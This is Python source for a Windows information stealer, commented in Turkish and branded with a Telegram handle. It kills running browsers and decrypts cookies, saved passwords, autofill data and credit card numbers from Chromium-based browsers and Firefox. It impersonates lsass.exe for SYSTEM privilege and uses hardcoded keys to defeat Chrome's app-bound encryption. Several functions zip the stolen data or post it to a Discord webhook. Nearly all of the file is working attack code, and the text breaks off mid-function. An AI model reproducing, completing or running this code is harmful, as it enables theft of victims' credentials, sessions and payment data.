
import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import requests
import time
import base64
import shutil
import subprocess
import zipfile
import tempfile
from datetime import datetime
from contextlib import contextmanager
from typing import Optional

import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305
from win32crypt import CryptUnprotectData

# psutil import with fallback
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("⚠️ psutil modülü bulunamadı. Tarayıcı kapatma özelliği devre dışı.")

class OperaCookieDecryptor:
    def __init__(self, local_state_path: str, cookies_path: str):
        self.local_state_path = local_state_path
        self.cookies_path = cookies_path
        self.decryption_key = self._get_decryption_key()
        
        if self.decryption_key is None:
            print("⚠️ Opera decryption key alınamadı, cookie decrypt edilemeyecek")

    def _get_decryption_key(self) -> bytes:
        try:
            with open(self.local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            # Opera için farklı key yolları dene
            encrypted_key = None
            
            # Yol 1: Standart Chrome yapısı
            if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Yol 2: Opera'nın kendi yapısı
            elif "encrypted_key" in local_state:
                encrypted_key = base64.b64decode(local_state["encrypted_key"])
            # Yol 3: Farklı bir yerde olabilir
            elif "crypt" in local_state and "encrypted_key" in local_state["crypt"]:
                encrypted_key = base64.b64decode(local_state["crypt"]["encrypted_key"])
            else:
                print(f"⚠️ Opera Local State'te encrypted_key bulunamadı. Mevcut anahtarlar: {list(local_state.keys())}")
                return None
            
            if encrypted_key:
                # Remove DPAPI prefix if exists
                if encrypted_key.startswith(b"DPAPI"):
                    encrypted_key = encrypted_key[5:]
                
                decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return bytes.fromhex(decrypted_key.hex())
            else:
                return None
                
        except Exception as e:
            return None

    def _decrypt_value(self, encrypted_value: bytes) -> Optional[str]:
        if not encrypted_value:
            return None

        # Opera için farklı formatları dene
        if encrypted_value.startswith(b"v10"):
            if self.decryption_key is None:
                return f"[ENCRYPTED_V10_{len(encrypted_value)}_BYTES]"
                
            try:
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]

                cipher = AES.new(self.decryption_key, AES.MODE_GCM, nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)

                try:
                    return decrypted.decode("utf-8")
                except UnicodeDecodeError:
                    return decrypted.hex()
            except Exception as e:
                return f"[DECRYPT_FAILED_{len(encrypted_value)}_BYTES]"
        
        elif encrypted_value.startswith(b"v11"):
            try:
                # DPAPI decryption
                decrypted = windows.crypto.dpapi.unprotect(encrypted_value[3:])
                return decrypted.decode("utf-8")
            except:
                return f"[ENCRYPTED_V11_{len(encrypted_value)}_BYTES]"
        
        else:
            # Plain text or unknown format
            try:
                return encrypted_value.decode("utf-8", errors='ignore')
            except:
                return f"[UNKNOWN_FORMAT_{len(encrypted_value)}_BYTES]"

    def extract_cookies(self) -> list:
        """Opera cookie'lerini çıkar"""
        cookies_data = []
        
        if self.decryption_key is None:
            print("❌ Opera decryption key yok, cookie'ler decrypt edilemiyor")
            return cookies_data
            
        try:
            con = sqlite3.connect(pathlib.Path(self.cookies_path).as_uri() + "?mode=ro", uri=True)
            cur = con.cursor()
            r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
            cookies = cur.fetchall()
            con.close()

            
            for host, name, encrypted_value in cookies:
                try:
                    decrypted_value = self._decrypt_value(encrypted_value)
                    if decrypted_value:
                        cookies_data.append({
                            'domain': host,
                            'name': name,
                            'value': decrypted_value
                        })
                except Exception as e:
                    continue
                    
        except Exception as e:
            pass
        
        return cookies_data

class YandexCookieDecryptor:
    def __init__(self, local_state_path: str, cookies_path: str):
        self.local_state_path = local_state_path
        self.cookies_path = cookies_path
        self.decryption_key = self._get_decryption_key()

    def _get_decryption_key(self) -> bytes:
        try:
            with open(self.local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove DPAPI prefix
            encrypted_key = encrypted_key[5:]
            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return bytes.fromhex(decrypted_key.hex())
        except Exception as e:
            raise RuntimeError(f"Failed to get decryption key: {str(e)}")

    def _decrypt_value(self, encrypted_value: bytes) -> Optional[str]:
        if not encrypted_value:
            return None

        if not encrypted_value.startswith(b"v10"):
            return None

        try:
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]

            cipher = AES.new(self.decryption_key, AES.MODE_GCM, nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)

            try:
                return decrypted.decode("utf-8")
            except UnicodeDecodeError:
                return decrypted.hex()
        except Exception as e:
            return None

    def extract_cookies(self) -> list:
        """Yandex cookie'lerini çıkar"""
        cookies_data = []
        try:
            con = sqlite3.connect(pathlib.Path(self.cookies_path).as_uri() + "?mode=ro", uri=True)
            cur = con.cursor()
            r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
            cookies = cur.fetchall()
            con.close()

            for host, name, encrypted_value in cookies:
                try:
                    decrypted_value = self._decrypt_value(encrypted_value)
                    if decrypted_value:
                        cookies_data.append({
                            'domain': host,
                            'name': name,
                            'value': decrypted_value
                        })
                except Exception as e:
                    continue
                    
        except Exception as e:
            pass
        
        return cookies_data

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def save_cookies_to_file(cookies_data, filename):
    """Cookie'leri dosyaya kaydet"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("-------------------------HTTPS://T.ME/HAIRO13X7-----------------\n")
            for cookie in cookies_data:
                f.write(f"{cookie['domain']}\tTRUE\t/\tFALSE\t0\t{cookie['name']}\t{cookie['value']}\n")
        return True
    except Exception as e:
        return False

def send_cookies_to_discord(cookies_data, webhook_url):
    """Cookie'leri Discord'a gönder"""
    try:
        filename = "hairo13x7.txt"
        if not save_cookies_to_file(cookies_data, filename):
            return False
        
        # Discord webhook payload
        files = {
            'file': (filename, open(filename, 'rb'), 'text/plain')
        }
        
        # Mesaj içeriği
        content = f"<:email_spacex:1429086532811358350> https://t.me/hairo13x7\n"
        content += f"<a:billing_postal:1429086529300598895> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        content += f"<a:billing_spacex:1429086530965868654> Chrome: {len(cookies_data)} cookie\n"
        
        payload = {
            'content': content,
            'username': 'https://t.me/hairo13x7',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&'
        }
        
        # Webhook'a dosya ile gönder
        response = requests.post(webhook_url, data=payload, files=files)
        
        # Dosyayı kapat
        files['file'][1].close()
        
        if response.status_code == 200:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def kill_browsers():
    """Tarayıcıları kapat"""
    if not PSUTIL_AVAILABLE:
        print("⚠️ psutil modülü bulunamadı, tarayıcılar kapatılamıyor")
        return
    
    browser_processes = [
        'chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe', 'operagx.exe',
        'firefox.exe', 'browser.exe', 'yandexbrowser.exe', 'vivaldi.exe',
        'amigo.exe', 'torch.exe', 'kometa.exe', 'orbitum.exe', 'centbrowser.exe',
        '7star.exe', 'sputnik.exe', 'epic.exe', 'uran.exe', 'iridium.exe',
        'opera_browser.exe', 'opera-browser.exe', 'operastable.exe',
        'operadeveloper.exe', 'operabeta.exe'
    ]
    
    killed_count = 0
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() in [p.lower() for p in browser_processes]:
                proc.kill()
                killed_count += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    if killed_count > 0:
        time.sleep(2)  # Tarayıcıların tamamen kapanması için bekle
    else:
        pass

def get_browser_configs():
    """Tüm tarayıcı konfigürasyonlarını döndür"""
    configs = {}
    
    # Chrome tabanlı tarayıcılar
    chrome_browsers = {
        'Chrome': 'Google\\Chrome',
        'Edge': 'Microsoft\\Edge',
        'Brave': 'BraveSoftware\\Brave-Browser',
        'Opera': 'Opera Software\\Opera Stable',
        'Opera_GX': 'Opera Software\\Opera GX',
        'Opera_Developer': 'Opera Software\\Opera Developer',
        'Opera_Beta': 'Opera Software\\Opera Beta',
        'Vivaldi': 'Vivaldi',
        'Amigo': 'Amigo',
        'Torch': 'Torch',
        'Kometa': 'Kometa',
        'Orbitum': 'Orbitum',
        'CentBrowser': 'CentBrowser',
        '7Star': '7Star\\7Star',
        'Sputnik': 'Sputnik\\Sputnik',
        'Epic': 'Epic Privacy Browser',
        'Uran': 'uCozMedia\\Uran',
        'Yandex': 'Yandex\\YandexBrowser',
        'Iridium': 'Iridium'
    }
    
    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5', 'Guest Profile']
    
    for browser_name, browser_path in chrome_browsers.items():
        for profile in profiles:
            local_state = os.path.expandvars(f"%LOCALAPPDATA%\\{browser_path}\\User Data\\Local State")
            cookie_db = os.path.expandvars(f"%LOCALAPPDATA%\\{browser_path}\\User Data\\{profile}\\Network\\Cookies")
            
            if os.path.exists(local_state) and os.path.exists(cookie_db):
                configs[f"{browser_name}_{profile}"] = {
                    'local_state': local_state,
                    'cookie_db': cookie_db,
                    'type': 'chrome'
                }
    
    # Firefox
    firefox_profiles = os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles")
    if os.path.exists(firefox_profiles):
        configs['Firefox'] = {
            'profiles_path': firefox_profiles,
            'type': 'firefox'
        }
    
    # Opera için özel path yapısı (Chrome'dan farklı)
    opera_configs = [
        # Opera Stable
        ("%APPDATA%\\Opera Software\\Opera Stable\\Default\\", "Opera_Stable_Default", "%APPDATA%\\Opera Software\\Opera Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera Stable\\Profile 1\\", "Opera_Stable_Profile_1", "%APPDATA%\\Opera Software\\Opera Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera Stable\\Profile 2\\", "Opera_Stable_Profile_2", "%APPDATA%\\Opera Software\\Opera Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera Stable\\Profile 3\\", "Opera_Stable_Profile_3", "%APPDATA%\\Opera Software\\Opera Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera Stable\\Profile 4\\", "Opera_Stable_Profile_4", "%APPDATA%\\Opera Software\\Opera Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera Stable\\Profile 5\\", "Opera_Stable_Profile_5", "%APPDATA%\\Opera Software\\Opera Stable\\"),
        
        # Opera Neon
        ("%APPDATA%\\Opera Software\\Opera Neon\\User Data\\Default\\", "Opera_Neon_Default", "%APPDATA%\\Opera Software\\Opera Neon\\User Data\\"),
        ("%APPDATA%\\Opera Software\\Opera Neon\\User Data\\Profile 1\\", "Opera_Neon_Profile_1", "%APPDATA%\\Opera Software\\Opera Neon\\User Data\\"),
        ("%APPDATA%\\Opera Software\\Opera Neon\\User Data\\Profile 2\\", "Opera_Neon_Profile_2", "%APPDATA%\\Opera Software\\Opera Neon\\User Data\\"),
        ("%APPDATA%\\Opera Software\\Opera Neon\\User Data\\Profile 3\\", "Opera_Neon_Profile_3", "%APPDATA%\\Opera Software\\Opera Neon\\User Data\\"),
        ("%APPDATA%\\Opera Software\\Opera Neon\\User Data\\Profile 4\\", "Opera_Neon_Profile_4", "%APPDATA%\\Opera Software\\Opera Neon\\User Data\\"),
        ("%APPDATA%\\Opera Software\\Opera Neon\\User Data\\Profile 5\\", "Opera_Neon_Profile_5", "%APPDATA%\\Opera Software\\Opera Neon\\User Data\\"),
        
        # Opera GX Stable
        ("%APPDATA%\\Opera Software\\Opera GX Stable\\Default\\", "Opera_GX_Default", "%APPDATA%\\Opera Software\\Opera GX Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera GX Stable\\Profile 1\\", "Opera_GX_Profile_1", "%APPDATA%\\Opera Software\\Opera GX Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera GX Stable\\Profile 2\\", "Opera_GX_Profile_2", "%APPDATA%\\Opera Software\\Opera GX Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera GX Stable\\Profile 3\\", "Opera_GX_Profile_3", "%APPDATA%\\Opera Software\\Opera GX Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera GX Stable\\Profile 4\\", "Opera_GX_Profile_4", "%APPDATA%\\Opera Software\\Opera GX Stable\\"),
        ("%APPDATA%\\Opera Software\\Opera GX Stable\\Profile 5\\", "Opera_GX_Profile_5", "%APPDATA%\\Opera Software\\Opera GX Stable\\"),
    ]
    
    for profile_path, browser_name, base_path in opera_configs:
        expanded_profile_path = os.path.expandvars(profile_path)
        expanded_base_path = os.path.expandvars(base_path)
        
        if os.path.exists(expanded_profile_path):
            
            # Opera Stable için farklı dosya yapısı
            if "Opera Stable" in profile_path:
                # Opera Stable direkt profil klasöründe dosyalar var
                local_state = os.path.join(expanded_base_path, "Local State")
                cookie_db = os.path.join(expanded_profile_path, "Network", "Cookies")
            else:
                # Opera Neon ve GX için Chrome benzeri yapı
                local_state = os.path.join(expanded_base_path, "Local State")
                cookie_db = os.path.join(expanded_profile_path, "Network", "Cookies")
            
            if os.path.exists(local_state) and os.path.exists(cookie_db):
                configs[browser_name] = {
                    'local_state': local_state,
                    'cookie_db': cookie_db,
                    'type': 'chrome'
                }
            else:
                print(f"⚠️ {browser_name} için Local State veya Cookies bulunamadı")
                print(f"   Local State: {os.path.exists(local_state)} - {local_state}")
                print(f"   Cookies: {os.path.exists(cookie_db)} - {cookie_db}")
    
    # Opera için alternatif path'ler dene
    
    return configs

def extract_firefox_cookies(profiles_path):
    """Firefox cookie'lerini çıkar"""
    cookies_data = []
    try:
        profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
        
        for profile in profiles:
            try:
                profile_path = os.path.join(profiles_path, profile)
                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
                
                if os.path.exists(cookies_db):
                    con = sqlite3.connect(pathlib.Path(cookies_db).as_uri() + "?mode=ro", uri=True)
                    cur = con.cursor()
                    r = cur.execute("SELECT host, name, value from moz_cookies;")
                    cookies = cur.fetchall()
                    con.close()
                    
                    for c in cookies:
                        cookies_data.append({
                            'domain': c[0],
                            'name': c[1],
                            'value': c[2]
                        })
            except Exception as e:
                pass
                
    except Exception as e:
        pass
    
    return cookies_data

def extract_firefox_passwords(profiles_path):
    """Firefox şifrelerini çıkar"""
    passwords_data = []
    try:
        profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
        
        for profile in profiles:
            try:
                profile_path = os.path.join(profiles_path, profile)
                logins_json = os.path.join(profile_path, 'logins.json')
                
                if os.path.exists(logins_json):
                    with open(logins_json, 'r', encoding='utf-8') as f:
                        logins = json.load(f)
                    
                    for login in logins.get('logins', []):
                        passwords_data.append({
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', ''),
                            'password': login.get('encryptedPassword', '')
                        })
            except Exception as e:
                pass
                
    except Exception as e:
        pass
    
    return passwords_data

def extract_passwords(local_state_path, login_db_path, browser_name):
    """Chrome tabanlı tarayıcıların şifrelerini çıkar"""
    passwords_data = []
    try:
        # Read Local State for master key
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        
        # Decrypt with SYSTEM DPAPI
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

        # Decrypt with user DPAPI
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        # Parse key blob
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        v20_master_key = derive_v20_master_key(parsed_data)

        # Fetch passwords
        con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        r = cur.execute("SELECT origin_url, username_value, password_value FROM logins;")
        passwords = cur.fetchall()
        con.close()

        # Decrypt passwords
        for p in passwords:
            try:
                encrypted_password = p[2]
                if encrypted_password.startswith(b"v10"):
                    # DPAPI decryption
                    decrypted_password = windows.crypto.dpapi.unprotect(encrypted_password[3:]).decode('utf-8')
                elif encrypted_password.startswith(b"v11"):
                    # DPAPI decryption
                    decrypted_password = windows.crypto.dpapi.unprotect(encrypted_password[3:]).decode('utf-8')
                elif encrypted_password.startswith(b"v20"):
                    # AES-GCM decryption
                    password_iv = encrypted_password[3:3+12]
                    encrypted_password_data = encrypted_password[3+12:-16]
                    password_tag = encrypted_password[-16:]
                    password_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=password_iv)
                    decrypted_password = password_cipher.decrypt_and_verify(encrypted_password_data, password_tag).decode('utf-8')
                else:
                    decrypted_password = encrypted_password.decode('utf-8', errors='ignore')
                
                passwords_data.append({
                    'url': p[0],
                    'username': p[1],
                    'password': decrypted_password
                })
            except Exception as e:
                continue
                
    except Exception as e:
        pass
    
    return passwords_data

def extract_autofill(local_state_path, web_data_path, browser_name):
    """Chrome tabanlı tarayıcıların autofill verilerini çıkar"""
    autofill_data = []
    try:
        con = sqlite3.connect(pathlib.Path(web_data_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        
        # Autofill data
        r = cur.execute("SELECT name, value FROM autofill;")
        autofill = cur.fetchall()
        
        # Credit cards
        r2 = cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;")
        credit_cards = cur.fetchall()
        
        con.close()
        
        for af in autofill:
            autofill_data.append({
                'type': 'autofill',
                'name': af[0],
                'value': af[1]
            })
        
        for cc in credit_cards:
            try:
                # Decrypt credit card number
                encrypted_cc = cc[3]
                if encrypted_cc:
                    decrypted_cc = windows.crypto.dpapi.unprotect(encrypted_cc).decode('utf-8')
                else:
                    decrypted_cc = "N/A"
                
                autofill_data.append({
                    'type': 'credit_card',
                    'name_on_card': cc[0],
                    'expiration_month': cc[1],
                    'expiration_year': cc[2],
                    'card_number': decrypted_cc
                })
            except:
                continue
                
    except Exception as e:
        pass
    
    return autofill_data

def save_cookies_to_file(cookies_data, filename, browser_name):
    """Cookie'leri dosyaya kaydet"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("-------------------------HTTPS://T.ME/HAIRO13X7-----------------\n")
            f.write(f"Browser: {browser_name}\n")
            f.write(f"Total Cookies: {len(cookies_data)}\n")
            f.write("-------------------------COOKIES-----------------\n")
            for cookie in cookies_data:
                f.write(f"{cookie['domain']}\tTRUE\t/\tFALSE\t0\t{cookie['name']}\t{cookie['value']}\n")
        return True
    except Exception as e:
        return False

def save_passwords_to_file(passwords_data, filename, browser_name):
    """Şifreleri dosyaya kaydet"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("-------------------------HTTPS://T.ME/HAIRO13X7-----------------\n")
            f.write(f"Browser: {browser_name}\n")
            f.write(f"Total Passwords: {len(passwords_data)}\n")
            f.write("-------------------------PASSWORDS-----------------\n")
            for pwd in passwords_data:
                f.write(f"URL: {pwd['url']}\n")
                f.write(f"Username: {pwd['username']}\n")
                f.write(f"Password: {pwd['password']}\n")
                f.write("-------------------------\n")
        return True
    except Exception as e:
        return False

def save_autofill_to_file(autofill_data, filename, browser_name):
    """Autofill verilerini dosyaya kaydet"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("-------------------------HTTPS://T.ME/HAIRO13X7-----------------\n")
            f.write(f"Browser: {browser_name}\n")
            f.write(f"Total Autofill: {len(autofill_data)}\n")
            f.write("-------------------------AUTOFILL-----------------\n")
            for af in autofill_data:
                if af['type'] == 'autofill':
                    f.write(f"Name: {af['name']}\n")
                    f.write(f"Value: {af['value']}\n")
                    f.write("-------------------------\n")
                elif af['type'] == 'credit_card':
                    f.write(f"Card Name: {af['name_on_card']}\n")
                    f.write(f"Expiration: {af['expiration_month']}/{af['expiration_year']}\n")
                    f.write(f"Card Number: {af['card_number']}\n")
                    f.write("-------------------------\n")
        return True
    except Exception as e:
        return False

def create_browser_data_zip(browser_data, zip_filename="hairo13x7.zip"):
    """Tüm tarayıcı verilerini ZIP dosyası olarak oluştur"""
    try:
        # Geçici klasör oluştur
        temp_dir = tempfile.mkdtemp()
        
        # Her tarayıcı için klasör oluştur ve dosyaları kaydet
        for browser_name, data in browser_data.items():
            browser_dir = os.path.join(temp_dir, browser_name.lower())
            os.makedirs(browser_dir, exist_ok=True)
            
            # Cookies
            if data.get('cookies'):
                cookies_file = os.path.join(browser_dir, "cookies.txt")
                save_cookies_to_file(data['cookies'], cookies_file, browser_name)
            
            # Passwords
            if data.get('passwords'):
                passwords_file = os.path.join(browser_dir, "passwords.txt")
                save_passwords_to_file(data['passwords'], passwords_file, browser_name)
            
            # Autofill
            if data.get('autofill'):
                autofill_file = os.path.join(browser_dir, "autofills.txt")
                save_autofill_to_file(data['autofill'], autofill_file, browser_name)
            
            # Cards (autofill içinden kredi kartları)
            cards = [item for item in data.get('autofill', []) if item.get('type') == 'credit_card']
            if cards:
                cards_file = os.path.join(browser_dir, "cards.txt")
                save_autofill_to_file(cards, cards_file, browser_name)
        
        # ZIP dosyası oluştur
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
        
        # Geçici klasörü temizle
        shutil.rmtree(temp_dir)
        
        return zip_filename
        
    except Exception as e:
        return None

def send_zip_to_discord(zip_filename, webhook_url, browser_stats):
    """ZIP dosyasını Discord'a gönder"""
    try:
        if not os.path.exists(zip_filename):
            return False
        
        # Cookie sayılarını hazırla
        cookie_stats = []
        for browser_name, stats in browser_stats.items():
            cookie_count = stats.get('cookies', 0)
            if cookie_count > 0:
                cookie_stats.append(f"{browser_name}({cookie_count})")
        
        # Mesaj oluştur
        message = f"<a:billing_address:1429086525446033470> ``Cookies:`` {', '.join(cookie_stats)}\n"
        message += f"<a:billing_spacex:1429086530965868654> ``Browsers:`` {len(browser_stats)}\n"
        message += f"<a:billing_postal:1429086529300598895> ``File:`` {zip_filename}"
        
        # Discord'a gönder
        with open(zip_filename, 'rb') as f:
            files = {'file': (zip_filename, f, 'application/zip')}
            data = {'content': message}
            
            response = requests.post(webhook_url, data=data, files=files)
            
            if response.status_code == 204:
                return True
            else:
                return False
                
    except Exception as e:
        return False

def send_cookies_to_discord(cookies_data, webhook_url, browser_name):
    """Cookie'leri Discord'a gönder"""
    try:
        filename = f"{browser_name.lower()}.txt"
        if not save_cookies_to_file(cookies_data, filename, browser_name):
            return False
        
        files = {'file': (filename, open(filename, 'rb'), 'text/plain')}
        
        content = f"<:email_spacex:1429086532811358350> https://t.me/hairo13x7\n"
        content += f"<a:billing_postal:1429086529300598895> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        content += f"<a:billing_spacex:1429086530965868654> {browser_name}: {len(cookies_data)} cookie\n"
        
        payload = {
            'content': content,
            'username': 'Cookie Bot',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&'
        }
        
        response = requests.post(webhook_url, data=payload, files=files)
        files['file'][1].close()
        
        if response.status_code == 200:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def send_passwords_to_discord(passwords_data, webhook_url, browser_name):
    """Şifreleri Discord'a gönder"""
    try:
        filename = f"{browser_name.lower()}_passwords.txt"
        if not save_passwords_to_file(passwords_data, filename, browser_name):
            return False
        
        files = {'file': (filename, open(filename, 'rb'), 'text/plain')}
        
        content = f"<:email_spacex:1429086532811358350> https://t.me/hairo13x7\n"
        content += f"<a:billing_postal:1429086529300598895> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        content += f"<a:billing_spacex:1429086530965868654> {browser_name}: {len(passwords_data)} şifre\n"
        
        payload = {
            'content': content,
            'username': 'Password Bot',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&'
        }
        
        response = requests.post(webhook_url, data=payload, files=files)
        files['file'][1].close()
        
        if response.status_code == 200:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def send_autofill_to_discord(autofill_data, webhook_url, browser_name):
    """Autofill verilerini Discord'a gönder"""
    try:
        filename = f"{browser_name.lower()}_autofill.txt"
        if not save_autofill_to_file(autofill_data, filename, browser_name):
            return False
        
        files = {'file': (filename, open(filename, 'rb'), 'text/plain')}
        
        content = f"<:email_spacex:1429086532811358350> https://t.me/hairo13x7\n"
        content += f"<a:billing_postal:1429086529300598895> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
